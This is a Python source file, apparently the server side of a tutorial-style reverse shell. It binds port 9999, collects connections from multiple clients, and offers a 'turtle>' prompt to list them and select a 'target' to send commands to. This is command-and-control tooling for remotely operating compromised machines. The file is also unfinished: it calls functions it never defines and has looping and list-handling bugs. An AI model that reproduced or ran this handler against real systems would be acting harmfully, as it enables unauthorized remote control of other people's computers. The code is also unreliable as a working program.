import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []



#Create a Socket
def create_socket():
    try:
        # We will declare global var to be able to access them outside the func
        global host
        global port
        global s  # socket
        host = ""  # will pop later
        port = 9999  # we will use 9999 as it is not popular
        s = socket.socket()  # create a socket object
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind the socket
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host, port))  # .bind is a socket method thats a tuple
        s.listen(5)  # allow 5 connections
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()  # if error, try again


# Handling connection from multiple clients and saving it to a list
# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # set the socket to blocking mode prevent timeout from happening

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established | IP: " + address[0] + " | Port: " + str(address[1]))
            # handle_client_connection(conn, address)
        except:
            print("Error accepting connections")

# 2nd Thread func - 1) See all clients 2) Select client 3) Send command
# Interactive prompt for sending commands - shell named turtle
# turtle>
# list 0-..

def start_turtle():
    cmd = input("turtle> ")

    if cmd.lower() == "list":
        list_connections()
    elif "select" in cmd.lower():
        conn = get_target(cmd)
        if conn is not None:
            send_target_commands(conn)
    else:
        print("Invalid command")


# Display all current active connections with the client

def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"

    print("----Clients----\n" + results)
